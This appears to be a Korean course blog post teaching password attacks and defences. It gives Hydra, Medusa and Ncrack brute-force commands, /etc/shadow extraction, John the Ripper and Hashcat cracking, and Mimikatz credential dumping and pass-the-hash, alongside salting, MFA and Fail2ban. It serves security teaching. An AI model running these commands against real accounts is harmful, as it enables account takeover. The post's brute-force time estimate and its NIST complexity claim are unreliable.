---
layout: post
title: "Phase 2-5: 비밀번호 공격 (Password Attack)"
date: 2024-12-30 09:00:02 +0900
categories: [general]
tags: [SK-Rookies, Lecture-Notes]
---

# Phase 2-5: 비밀번호 공격 (Password Attack)

## 학습 목표
- 비밀번호 공격의 유형과 메커니즘 이해
- Brute-Force와 Dictionary Attack의 차이점 파악
- Rainbow Table 공격 원리와 Salt의 중요성 학습
- 온라인/오프라인 공격의 차이 이해
- Password Cracking 도구 실전 활용
- 강력한 비밀번호 정책과 다중인증 방어 습득

---

## 1. 비밀번호 공격 개요

### 1.1 왜 비밀번호를 공격하는가?

**인증의 중요성**
```
비밀번호 = 가장 일반적인 인증 수단
- 웹 서비스
- OS 로그인
- VPN, SSH
- 데이터베이스

비밀번호 탈취 = 계정 장악
```

### 1.2 공격 유형

```
1. Online Attack (온라인)
   - 실제 서비스에 직접 시도
   - 느림, 탐지 가능
   - 예: 웹 로그인 Brute-Force

2. Offline Attack (오프라인)
   - 해시된 비밀번호 파일 탈취 후
   - 로컬에서 크래킹
   - 빠름, 탐지 불가
   - 예: /etc/shadow 크래킹
```

---

## 2. Brute-Force Attack

### 2.1 원리

**모든 가능한 조합 시도**
```
문자 집합:
- 소문자: a-z (26개)
- 대문자: A-Z (26개)
- 숫자: 0-9 (10개)
- 특수문자: !@#$%^&*() 등 (32개)

예시: 4자리 숫자 PIN
가능한 조합: 10^4 = 10,000개
0000, 0001, 0002, ..., 9999

예시: 8자리 영문 소문자
가능한 조합: 26^8 = 208,827,064,576개 (약 2,088억)
```

**시간 계산**
```
속도: 초당 1,000개 시도 가능

4자리 PIN:
10,000 / 1,000 = 10초

8자리 소문자:
208,827,064,576 / 1,000 = 208,827,064초
= 2,416일 = 6.6년

8자리 대소문자+숫자+특수문자:
(26+26+10+32)^8 = 6.63 × 10^15
= 210,548,400년 (현실적으로 불가능)
```

### 2.2 온라인 Brute-Force

**SSH Brute-Force**
```bash
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
# -l: 사용자명
# -P: 비밀번호 리스트

# Medusa
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh

# Ncrack
ncrack -p 22 --user root -P passwords.txt 192.168.1.100
```

**HTTP Form Brute-Force**
```bash
# Hydra
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
# ^USER^, ^PASS^: 치환자
# 마지막: 실패 시 표시 문자열

# Burp Suite Intruder
# GUI 도구, Payloads 설정
```

**제약**
```
1. 속도 제한
   - 네트워크 지연
   - 서버 처리 시간
   - Rate Limiting

2. 탐지 가능
   - 로그에 기록
   - 계정 잠금
   - IDS/IPS 탐지

3. IP 차단
   - 다수 실패 시 자동 차단
```

### 2.3 오프라인 Brute-Force

**전제 조건**
```
해시된 비밀번호 파일 탈취:
- /etc/shadow (Linux)
- SAM 파일 (Windows)
- 데이터베이스 덤프
```

**Linux 예시**
```bash
# /etc/shadow 내용
user:$6$salt$hashedpassword:18000:0:99999:7:::

형식:
username:$id$salt$hash:...

$id:
  $1$ = MD5
  $5$ = SHA-256
  $6$ = SHA-512
  $y$ = yescrypt
```

**Windows 예시**
```
SAM 파일:
C:\Windows\System32\config\SAM

NTLM Hash:
Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:
              31D6CFE0D16AE931B73C59D7E0C089C0:::

LM Hash (취약, 사용 금지)
NTLM Hash (여전히 취약, Rainbow Table 가능)
```

**크래킹 도구**

**John the Ripper**
```bash
# 설치
sudo apt install john

# 해시 파일 준비
sudo unshadow /etc/passwd /etc/shadow > hashes.txt

# Brute-Force (기본)
john hashes.txt

# Dictionary 모드
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# 진행 상황 확인
john --show hashes.txt

# 특정 형식
john --format=sha512crypt hashes.txt

# Incremental 모드 (Brute-Force)
john --incremental hashes.txt
```

**Hashcat**
```bash
# 설치
sudo apt install hashcat

# GPU 가속 크래킹
hashcat -m 1800 -a 0 hashes.txt rockyou.txt
# -m: Hash type (1800 = SHA-512 Unix)
# -a: Attack mode (0 = Dictionary)

# Brute-Force (Mask Attack)
hashcat -m 1800 -a 3 hashes.txt ?l?l?l?l?l?l?l?l
# ?l = 소문자, ?u = 대문자, ?d = 숫자, ?s = 특수문자
# 8자리 소문자

# Combinator Attack
hashcat -m 1800 -a 1 hashes.txt wordlist1.txt wordlist2.txt
# word1 + word2 조합

# Rule-based Attack
hashcat -m 1800 -a 0 hashes.txt rockyou.txt -r best64.rule
# 변형 규칙 적용 (password → p@ssw0rd, Password123 등)
```

**해시 타입 (-m 옵션)**
```
0    = MD5
100  = SHA-1
1400 = SHA-256
1700 = SHA-512
1800 = SHA-512 Unix ($6$)
3200 = bcrypt
5600 = NetNTLMv2
13100 = Kerberos 5 TGS-REP
```

---

## 3. Dictionary Attack

### 3.1 원리

**사전 파일 사용**
```
일반적인 비밀번호 목록:
- password
- 123456
- qwerty
- admin
- letmein
- monkey
- dragon

유명 사전:
- RockYou.txt (14,341,564개)
- SecLists
- CrackStation
```

**장점**
```
- Brute-Force보다 훨씬 빠름
- 현실적 시간 내 가능
- 사람들의 비밀번호 패턴 활용
```

### 3.2 주요 Wordlists

**RockYou.txt**
```bash
# 위치 (Kali Linux)
/usr/share/wordlists/rockyou.txt.gz

# 압축 해제
gunzip /usr/share/wordlists/rockyou.txt.gz

# 크기: 약 133MB, 14,341,564줄
wc -l /usr/share/wordlists/rockyou.txt
```

**SecLists**
```bash
# 설치
git clone https://github.com/danielmiessler/SecLists

# 구조:
SecLists/
  Passwords/
    Common-Credentials/
    Leaked-Databases/
    Malware/
  Usernames/
  ...
```

**사용자 정의 Wordlist 생성**
```bash
# Cewl (웹사이트에서 단어 추출)
cewl http://target.com -w custom_wordlist.txt
# 대상 사이트 크롤링 → 단어 수집

# Crunch (패턴 기반 생성)
crunch 8 8 -t pass%%%% -o wordlist.txt
# 8자리, "pass" + 4자리 숫자
# pass0000, pass0001, ..., pass9999
```

### 3.3 Dictionary Attack 예시

**웹 로그인**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

**SSH**
```bash
hydra -l root -P common-passwords.txt ssh://192.168.1.100
```

**ZIP 파일**
```bash
# fcrackzip
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
# -u: Unzip test
# -D: Dictionary
# -p: Wordlist path
```

**PDF 파일**
```bash
# pdfcrack
pdfcrack -f file.pdf -w rockyou.txt
```

---

## 4. Rainbow Table Attack

### 4.1 개념

**문제: 해시 크래킹 시간**
```
MD5("password") = 5f4dcc3b5aa765d61d8327deb882cf99

Brute-Force:
- 매번 해시 계산 필요
- 느림

Rainbow Table:
- 미리 계산된 해시 테이블
- 해시 → 평문 매핑
- 검색만 하면 됨 (빠름!)
```

**Time-Memory Tradeoff**
```
저장 공간 사용 ↔ 시간 절약

예:
8자리 소문자 (26^8 = 약 2,088억)
모든 조합의 MD5 해시 미리 계산
→ 테이블 크기: 수 TB

검색: 초 단위
계산: 년 단위
```

**Rainbow Table 구조**
```
Reduction Function:
Hash → Plaintext (일부만 복원, 체인 생성용)

Chain:
password → Hash → Reduce → p@ssw0rd → Hash → ...
                                      ↑ 테이블에 저장 (시작점, 끝점)

검색:
1. 주어진 해시로 체인 생성
2. 끝점이 테이블에 있는지 확인
3. 있으면 해당 체인 재계산
4. 원본 비밀번호 찾음
```

### 4.2 Rainbow Table 도구

**RainbowCrack**
```bash
# 테이블 생성 (시간 소요)
rtgen md5 loweralpha 1 7 0 3800 33554432 0

# 크래킹
rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99
# .: 현재 디렉토리의 Rainbow Table 사용
```

**Ophcrack (Windows)**
```
- GUI 도구
- Windows LM/NTLM 해시 크래킹
- 무료 Rainbow Table 제공
```

**온라인 Rainbow Table**
```
CrackStation.net:
- 15GB Rainbow Table
- 무료 웹 인터페이스
- MD5, SHA1, LM, NTLM 등

HashKiller.io:
- 커뮤니티 기반
```

### 4.3 Salt: Rainbow Table 방어

**Salt란?**
```
비밀번호에 추가하는 랜덤 값

Without Salt:
Hash("password") = 5f4dcc3b5aa765d61d8327deb882cf99
→ Rainbow Table에 있음!

With Salt:
Salt = "abc123"
Hash("password" + "abc123") = 다른 해시
→ Rainbow Table 무용지물
```

**사용자별 고유 Salt**
```
User1:
  Password: "password"
  Salt: "x7j2k9"
  Hash: Hash("password" + "x7j2k9")

User2:
  Password: "password" (같음!)
  Salt: "m3n8p1" (다름!)
  Hash: Hash("password" + "m3n8p1") (다른 해시!)

→ 같은 비밀번호도 다른 해시
→ Rainbow Table로 일괄 크래킹 불가
```

**DB 저장**
```
users 테이블:
username | salt      | hash
---------|-----------|------------------------------------------
alice    | x7j2k9    | a1b2c3d4e5f6...
bob      | m3n8p1    | f6e5d4c3b2a1...

로그인 검증:
입력: "password"
1. DB에서 사용자 Salt 조회
2. Hash(입력 + Salt) 계산
3. DB의 Hash와 비교
```

**Salt 크기**
```
권장: 16바이트 (128비트) 이상
- 충분히 큰 값
- 랜덤 생성 (os.urandom, secrets)
```

---

## 5. Credential Stuffing

### 5.1 원리

**유출된 자격증명 재사용**
```
문제: 사용자들이 여러 사이트에 같은 비밀번호 사용

공격:
1. 사이트 A에서 유출된 DB 획득
   (email:password 쌍)

2. 사이트 B, C, D에서 로그인 시도

3. 같은 비밀번호 사용자 → 성공!
```

**유명 데이터 유출 사례**
```
- RockYou (2009): 32M
- LinkedIn (2012): 117M
- Adobe (2013): 153M
- Yahoo (2013): 3B
- Dropbox (2016): 68M
- Collection #1 (2019): 773M (통합)
```

### 5.2 Credential Stuffing 도구

**Sentry MBA**
```
- 자동화 도구
- 프록시 로테이션
- CAPTCHA 우회 시도
```

**방어**
```
1. Rate Limiting
   - 로그인 시도 제한

2. CAPTCHA
   - Bot 차단

3. Multi-Factor Authentication (MFA)
   - 비밀번호 외 추가 인증

4. Breach Notification
   - Have I Been Pwned API
   - 유출된 비밀번호 차단
```

---

## 6. Pass-the-Hash

### 6.1 개념 (Windows 특화)

**원리**
```
Windows NTLM 인증:
- 평문 비밀번호를 서버에 전송하지 않음
- Hash를 전송

공격:
1. Hash 탈취 (메모리 덤프, SAM)
2. 평문 비밀번호 없이 Hash만으로 인증

→ "비밀번호를 모르지만 로그인 가능"
```

**Mimikatz**
```powershell
# 관리자 권한 필요
mimikatz.exe

# 메모리에서 자격증명 추출
sekurlsa::logonpasswords

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
```

**방어**
```
1. Credential Guard (Windows 10+)
   - 가상화 기반 보안
   - LSASS 보호

2. 최소 권한
   - 관리자 계정 최소 사용

3. Kerberos 사용
   - NTLM 비활성화
```

---

## 7. 비밀번호 정책 및 방어

### 7.1 강력한 비밀번호 정책

**NIST 가이드라인 (SP 800-63B)**
```
권장:
- 최소 8자 (12자 이상 권장)
- 대소문자, 숫자, 특수문자 조합
- 사전 단어 금지
- 개인정보 금지 (이름, 생일)

비권장 (구식):
- 주기적 변경 강제 (90일마다)
  → 사용자가 약한 변형 사용 (password1 → password2)
- 복잡도 강제만
  → Tr0ub4dor&3 (복잡하지만 약함)
  → correct horse battery staple (길고 강함)
```

**zxcvbn (비밀번호 강도 측정)**
```javascript
// Dropbox의 오픈소스 라이브러리
zxcvbn("password")
// 점수: 0 (매우 약함)

zxcvbn("correct horse battery staple")
// 점수: 4 (강함)
```

### 7.2 Account Lockout

**설정**
```
실패 5회 → 계정 잠금 30분

장점: Brute-Force 방어
단점: DoS 가능 (공격자가 의도적으로 계정 잠금)

균형:
- Progressive Delay (점진적 지연)
  1회 실패: 즉시 재시도
  2회: 2초 대기
  3회: 4초 대기
  4회: 8초 대기
  ...
```

### 7.3 Multi-Factor Authentication (MFA)

**유형**
```
1. Something You Know
   - 비밀번호, PIN

2. Something You Have
   - OTP (TOTP, HOTP)
   - SMS 코드
   - 하드웨어 토큰 (YubiKey)

3. Something You Are
   - 지문, 얼굴, 홍채
```

**TOTP (Time-based OTP)**
```
Google Authenticator, Authy

원리:
1. 서버와 클라이언트가 Shared Secret 공유
2. 현재 시간 기반 코드 생성 (30초마다 변경)
3. 코드 일치 확인

→ SMS보다 안전 (SIM Swapping 방어)
```

**FIDO2 / WebAuthn**
```
- 하드웨어 키 (YubiKey, Titan Key)
- Phishing 방어 (도메인 바인딩)
- Passwordless 가능
```

### 7.4 Password Manager

**권장**
```
1Password, Bitwarden, KeePass

장점:
- 사이트별 강력한 고유 비밀번호
- 자동 생성
- 자동 입력

→ Credential Stuffing 방어
```

---

## 8. 실습 과제

### 과제 1: 해시 크래킹 (John the Ripper)
```bash
# 1. 테스트 사용자 생성
sudo useradd -m testuser
echo "testuser:password123" | sudo chpasswd

# 2. 해시 추출
sudo unshadow /etc/passwd /etc/shadow | grep testuser > hash.txt

# 3. 크래킹
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# 4. 결과 확인
john --show hash.txt
```

### 과제 2: Hashcat GPU 크래킹
```bash
# MD5 해시 생성
echo -n "secret" | md5sum > md5hash.txt
# 5ebe2294ecd0e0f08eab7690d2a6ee69

# Hashcat 크래킹
hashcat -m 0 -a 0 md5hash.txt rockyou.txt
# -m 0: MD5
# -a 0: Dictionary

# 결과
hashcat -m 0 --show md5hash.txt
```

### 과제 3: 온라인 Brute-Force 방어
```bash
# Fail2ban 설치
sudo apt install fail2ban

# SSH 보호 설정
sudo nano /etc/fail2ban/jail.local

[sshd]
enabled = true
maxretry = 3
findtime = 600
bantime = 3600

# 재시작
sudo systemctl restart fail2ban

# 차단 상태 확인
sudo fail2ban-client status sshd
```

---

## 9. 연결 포인트

### Phase 1.3: Information Security
→ **해시 함수**: 비밀번호 저장
→ **Salt**: Rainbow Table 방어

### Phase 2.1: Scanning/Sniffing
→ **Sniffing**: 평문 비밀번호 탈취

### Phase 2.2: Spoofing
→ **Phishing**: 비밀번호 탈취

### Phase 2.3: Session Hijacking
→ **Cookie**: Session ID vs 비밀번호

### Phase 3.2: IDS/IPS
→ **Brute-Force 탐지**: 다수 로그인 실패

---

## 10. 핵심 요약

**공격 유형**
- Brute-Force: 모든 조합
- Dictionary: 사전 파일
- Rainbow Table: 미리 계산된 해시
- Credential Stuffing: 유출 DB 재사용

**온라인 vs 오프라인**
- Online: 느림, 탐지 가능, Rate Limiting
- Offline: 빠름, 탐지 불가, 해시 파일 필요

**방어**
- 강력한 비밀번호 (길이 > 복잡도)
- Salt (Rainbow Table 방어)
- MFA (2FA)
- Password Manager
- Account Lockout (Progressive Delay)
- Breach Monitoring

**도구**
- John the Ripper
- Hashcat (GPU 가속)
- Hydra (온라인)
- Ophcrack (Windows)

---

**Phase 2 완료!** 공격 기법 전체 학습 완료
